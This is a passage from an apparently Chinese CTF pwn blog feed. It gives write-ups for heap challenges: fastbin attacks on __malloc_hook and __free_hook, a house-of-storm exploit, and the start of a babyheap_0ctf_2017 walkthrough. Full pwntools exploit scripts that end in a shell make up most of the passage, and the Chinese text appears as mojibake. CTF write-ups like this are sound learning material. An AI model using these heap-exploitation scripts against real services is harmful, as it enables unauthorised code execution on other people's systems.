    __malloc_hook <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token number">0x70</span>
    libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
    fake_chunk <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span>

    add<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token comment">#10</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#11</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#12</span>
    
    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
    
    edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#13</span>

    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#14</span>
    <span class="token comment"># add(0x68)#15</span>
    libc<span class="token punctuation">.</span>address<span class="token operator">=</span>libc_base

    oog <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f29e</span><span class="token punctuation">,</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span><span class="token number">0x4f302</span><span class="token punctuation">,</span><span class="token number">0x10a2fc</span><span class="token punctuation">]</span>
   	pl <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x1b</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>oog<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"realloc"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"leak"</span><span class="token punctuation">,</span>leak<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"fake_chunk"</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span>

    <span class="token comment"># gdb()</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://s2.loli.net/2024/08/21/38DxIWM1GX6sRmf.png" alt="e76264eed7092de47da47eb9361ae351.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#æ”¹__free_hookä¸ºsystem</span>
<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    <span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
        ru<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
        s<span class="token punctuation">(</span>content<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token comment">#heap - 0x4080</span>
    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#0</span>
    add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment">#1</span>
    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#2</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#3-9</span>
        add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        delete<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>
    
    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"Content:"</span><span class="token punctuation">)</span>
    leak <span class="token operator">=</span> uu64<span class="token punctuation">(</span><span class="token punctuation">)</span>
    __malloc_hook <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token number">0x70</span>
    libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
    free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span>

    add<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token comment">#10</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#11</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#12</span>
    
    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
    
    edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#13</span>

    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#14</span>
    
    libc<span class="token punctuation">.</span>address<span class="token operator">=</span>libc_base

    oog <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f29e</span><span class="token punctuation">,</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span><span class="token number">0x4f302</span><span class="token punctuation">,</span><span class="token number">0x10a2fc</span><span class="token punctuation">]</span>
    pl <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    
    edit<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span>

    edit<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">'/bin/bash\x00'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"leak"</span><span class="token punctuation">,</span>leak<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"free_hook"</span><span class="token punctuation">,</span>free_hook<span class="token punctuation">)</span>
    
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://s2.loli.net/2024/08/21/PjS1LGHmAu3DqJV.png" alt="736948c0d7c84396d1be5d72195a6809.png"></p>
<h5 id="simple-storm"><a href="#simple-storm" class="headerlink" title="simple_storm"></a>simple_storm</h5><blockquote>
<p>å…¶å®æˆ‘æƒ³èµ·æ¥æ‰“è¿™ä¸ªé¶åœºï¼Œè¿˜æ˜¯åœ¨å­¦ä¹ house of stormçš„æ—¶å€™ã€‚çœ‹åˆ°äº†è¿™ä¸ªåœ°æ–¹æœ‰è¿™ä¸ªé¢˜ã€‚æ‰€ä»¥å°±ç»™å®ƒæ‰“äº†ã€‚</p>
</blockquote>
<p>è¿™é¢˜é¡¾åæ€ä¹‰ï¼Œè‚¯å®šç”¨house of stormæ¥æ‰“ã€‚</p>
<ul>
<li>é€‚åˆç‰ˆæœ¬æ˜¯libc2.23-2.29</li>
<li>éœ€è¦èƒ½ä¿®æ”¹<em>unsortedbinçš„bkï¼Œ</em>largebinçš„bk,bk_nextsize</li>
</ul>
<p>åŸç†ç½‘ä¸Šéƒ½æ˜¯ï¼Œå…¶å®è®°ä¸è®°å¾—é—®é¢˜ä¹Ÿä¸å¤§ã€‚å°±åªéœ€è¦çŸ¥é“ä½ éœ€è¦æ„é€ ä¸€ä¸ªunsortedbinå’Œlargebinï¼Œä¿®æ”¹unsortedbinçš„bk&#x3D;target_addr(ç›®æ ‡åœ°å€), ä¿®æ”¹largebinçš„bk&#x3D;target_addr + 0x8, bk_nextsize &#x3D; target_addr -0x20+3(0x1d)ï¼Œä¹‹ååœ¨ç”³è¯·ä¸€ä¸ª0x50èŒƒå›´çš„chunkå°±å¯ä»¥å¾—åˆ°ç›®æ ‡åœ°å€ã€‚</p>
<p>æœ¬é¢˜ç›´æ¥æ‰“free_hook,å°±å¯ä»¥äº†ã€‚è¿™ä¸ªæˆåŠŸæ¦‚ç‡å¤§æ¦‚50%æ‰€ä»¥å¤šè¯•å‡ æ¬¡å°±å¥½äº†ã€‚</p>
<p>æˆåŠŸä¿®æ”¹__free_hookä¸ºsystem</p>
<p><img src="https://s2.loli.net/2024/08/21/mPYs8j7w3tN6x4R.png" alt="072ea12359d232de973be0a524ab730a.png"></p>
<p>æœ€ågetshell</p>
<p><img src="https://s2.loli.net/2024/08/21/OP3Cfnx7ytNgQEi.png" alt="0e161d9deab4acea5f14897cb747e948.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    <span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
        ru<span class="token punctuation">(</span><span class="token string">"Your choice?\n"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
        s<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
        s<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
        s<span class="token punctuation">(</span>content<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
        s<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#0</span>
    add<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token comment">#1</span>
    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#2</span>
    add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">)</span><span class="token comment">#3</span>
    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#4</span>
    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#5</span>
    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#6</span>

    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>

    show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    main_arenas <span class="token operator">=</span> uu64<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x58</span>

    show<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    heap <span class="token operator">=</span> u68<span class="token punctuation">(</span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#5 = 7 </span>
    add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">)</span><span class="token comment">#3 = 8</span>

    delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

    malloc_hook <span class="token operator">=</span> main_arenas <span class="token operator">-</span> <span class="token number">0x10</span>
    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
    fake_chunk <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x10</span>

    pl <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span> 
    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span>                      <span class="token comment">#ä¿®æ”¹unsortedbinçš„bk=addr</span>

    <span class="token comment">#pl = p64(0) + p64(fake_chunk+0x8) + p64(0) + p64(fake_chunk - 0x1d)</span>
    pl <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk <span class="token operator">-</span> <span class="token number">0x20</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span>                      <span class="token comment">#ä¿®æ”¹largebinçš„bk=addr+0x8,bk_nextsize=addr-0x20+3</span>

    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span> <span class="token comment">#å»ºè®®å…ˆeditä¹‹ååœ¨ç”³è¯·0x50èŒƒå›´çš„chunkï¼Œè¿™ä¸ªæ˜¯æœ‰æ¦‚ç‡æˆåŠŸçš„</span>

    add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>
    
    pl <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span>

    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"fake_chunk"</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"main_arenas"</span><span class="token punctuation">,</span>main_arenas<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span>heap<span class="token punctuation">)</span>
    <span class="token comment"># gdb()</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>æ‚¨èƒ½çœ‹åˆ°è¿™é‡Œï¼Œæˆ‘çœŸçš„å¾ˆå¼€å¿ƒã€‚å°±å¦‚æˆ‘çš„æ‘˜å½•æ‰€è¯´ï¼Œæ‰“CTFä¹Ÿæ˜¯ä¸€ä¸ªå…´è¶£ï¼Œå¼ºåˆ¶æ¶ˆè´¹æ‰å¯ä»¥é˜…è¯»wpè¿™å¤šå°‘æœ‰ç‚¹å¯’äº†æ–°æ‰‹çš„å¿ƒï¼Œæˆ‘æœ¬äººå­¦pwnå¤§æ¦‚å¿«å°åŠå¹´äº†ï¼Œä¸ªäººæ„Ÿè§‰ä¸‡äº‹å¼€å¤´éš¾ï¼Œå¤šç»è¿‡å‡ æ¬¡æŠ˜ç£¨åç‰¢å°±ä¼šæœ‰æ‰€æå‡ã€‚æˆ‘å†™è¿™ç¯‡æ–‡ç« çš„ç›®çš„å°±æ˜¯ä¸ºäº†è®©æ–°ç”Ÿæœ‰ä¸ªå¯ä»¥å‚è€ƒçš„åœ°æ–¹ï¼Œå½“ç„¶å¦‚æœæ‚¨æ˜¯ä¸ªå¯Œå“¥ï¼Œä¹Ÿå¯ä»¥ç»™æˆ‘çš„èµåŠ©ä¸€ç‚¹ã€‚å› ä¸ºæœ¬äººæƒ³ç©é»‘çŒ´ï¼Œå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆã€‚</p>
<p>æœ€åå¼•ç”¨å­™æ‚Ÿç©ºçš„ä¸€å¥è¯é€ç»™æ­£åœ¨é˜…è¯»è¿™ç¯‡æ–‡ç« çš„æ‚¨ï¼š</p>
<p><strong>äººç”Ÿè´µåœ¨åšæŒï¼ŒåŠé€”è€ŒåºŸè€…å¤šæ€¨å¤©å°¤äººï¼Œä¸æ‡ˆåŠªåŠ›è€…æ€»å‹‡æ”€é«˜å³°ã€‚</strong></p>
</blockquote>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>Binary</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]PWNâ€”â€”babyheap_0ctf_2017</title>
    <url>/2024/07/17/buuctf-pwn%E2%80%94%E2%80%94babyheap-0ctf-2017/</url>
    <content><![CDATA[<p>é¦–å…ˆæŸ¥çœ‹ä¿æŠ¤</p>
<p><img src="https://s2.loli.net/2024/08/19/spICMFTbBlDW1dE.png" alt="557822afedec40a936b1ccdafd9fe8ce.png"></p>
<p>å…¨å¼€æ˜¯å§ï¼ï¼ï¼</p>
<p>æ”¾ç¥çš„æ­¦å™¨idaé‡Œé¢çœ‹çœ‹</p>
<p>mainå‡½æ•°ä¸€çœ¼ï¼Œèœå•é¢˜</p>
<p><img src="https://s2.loli.net/2024/08/19/zpTu1V2djsnq6Ui.png" alt="5230ec33334c28d704b55ebdc232fb8f.png"></p>
<p>addå‡½æ•°å°±å¾ˆæ­£å¸¸ï¼Œè°ƒç”¨callocå‡½æ•°æ¥ç”³è¯·å †å—ã€‚ï¼ˆcallocå‡½æ•°å’Œmallocå‡½æ•°çš„åŒºåˆ«å°±æ˜¯æ˜¯å¦è¿›è¡Œåˆå§‹åŒ–ï¼Œè™½ç„¶callocåˆå§‹åŒ–çœ‹ç€æ›´å®‰å…¨ç‚¹ï¼Œä½†æ˜¯æ€§èƒ½ç‰¹åˆ«æ…¢ï¼Œè€Œä¸”åœ¨å®é™…ç¯å¢ƒä¸­å¥½å¤šå˜é‡éƒ½ä¸éœ€è¦è¿›è¡Œåˆå§‹åŒ–ï¼‰</p>
<p><img src="https://s2.loli.net/2024/08/19/SIuNGD4h27bemKA.png" alt="762cd5e36728edefadd54c99357b2654.png"></p>
<p>editå‡½æ•°ï¼Œå‘ç°ä¸€ä¸ªé—®é¢˜å°±æ˜¯sizeæ²¡æœ‰åšé™åˆ¶ï¼Œä½†æœ‰ä¸ªloopholeå‡½æ•°</p>
<p><img src="https://s2.loli.net/2024/08/19/IjgY2ibzqMnE5Gm.png" alt="f8639f0301459ad82bf6e50b00023e57.png"></p>
<p>å¥½å§ï¼Œå°±æ˜¯æ­£å¸¸çš„è¯»</p>
<p><img src="https://s2.loli.net/2024/08/19/4hCuPOJGsmLcSDz.png" alt="3bb28a0228f1eca04e80c9cde43bc63c.png"></p>
<p>deleteå‡½æ•°ï¼Œå¾ˆæ ‡å‡†ï¼Œæ²¡æœ‰uafã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/pl5T6OUYswDWXaN.png" alt="53c904a44c237cdaa026a029e3f57ac7.png"></p>
<p>showå‡½æ•°ä¹Ÿå¾ˆæ­£å¸¸</p>
<p><img src="https://s2.loli.net/2024/08/19/jqMRIOSUw3zohtp.png" alt="b8a45a519af11fb31ed058a0eb74a411.png"></p>
<p>å¾ˆæ­£å¸¸çš„è¾“å‡º</p>
<p><img src="https://s2.loli.net/2024/08/19/IjgY2ibzqMnE5Gm.png" alt="f8639f0301459ad82bf6e50b00023e57.png"></p>
<h5 id="åˆ©ç”¨ç‚¹"><a href="#åˆ©ç”¨ç‚¹" class="headerlink" title="åˆ©ç”¨ç‚¹"></a>åˆ©ç”¨ç‚¹</h5><p> åˆ†æå®Œï¼Œæœ‰é‚£ä¸ªæ— çº¿é•¿åº¦ç¼–è¾‘ã€‚</p>
<h5 id="åˆ†æexp"><a href="#åˆ†æexp" class="headerlink" title="åˆ†æexp"></a>åˆ†æexp</h5><p>ç”³è¯·5ä¸ªchunkï¼Œåœ¨freeæ‰chunk_1ï¼Œchunk_2ã€‚åœ¨ä¿®æ”¹chunk_2çš„fdæŒ‡é’ˆçš„ä½ä¸¤å­—èŠ‚çš„å€¼ä¸º0x80ï¼Œå°†å…¶ä¿®æ”¹ä¸ºchunk_4çš„åœ°å€ï¼Œåœ¨ä¿®æ”¹chunk_4çš„sizeä½ä¸º0x21ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/f1FoqbDwnyOjzh2.png" alt="b523610d56a3295b5c3e05d3baeae585.png"></p>
<p><a href="https://s2.loli.net/2024/08/19/UcuCsNIbVmL2HzF.png">50315c790ba99b46f8f72f37490c146a.png</a></p>
<p>æ­¤æ—¶æŸ¥çœ‹fastbinsï¼Œæ­¤æ—¶fastbinsé‡Œé¢æœ‰ä¸¤ä¸ªchunkï¼Œä¸€ä¸ªæ˜¯chunk_4,ä¸€ä¸ªæ˜¯chunk_2</p>
<p><img src="https://s2.loli.net/2024/08/19/N7l1nW9if3K6jOB.png" alt="3a0c60cbced8ca6c16c91223aae8c598.png"></p>
<p>åœ¨ç”³è¯·å›æ¥ä¸¤ä¸ªchunkï¼Œåˆ©ç”¨fastbinsåè¿›å…ˆå‡ºã€‚ç°åœ¨chunk_4å’Œchunk_2å †é‡å äº†ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/pahQ5JBbmf7LP3D.png" alt="6ecaf84124c019d6ddfe460f36e27025.png"></p>
<p>åœ¨æ¢å¤chunk_4çš„sizeå¤§å°,å†ç”³è¯·ä¸€å°å—å†…å­˜ï¼Œé˜²æ­¢ä½ åé¢delete chunk_4çš„æ—¶å€™å…¶ä¸top chunkåˆå¹¶</p>
<p><img src="https://s2.loli.net/2024/08/19/jW2M8Owax7dTX3f.png" alt="90dae465ef57556d97a7235da0039194.png"></p>
<p>ç°åœ¨delete chunk_4ï¼Œå…¶ä¼šè¿›å…¥åˆ°unsortbinsé‡Œé¢ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¥—è·¯äº†ã€‚</p>
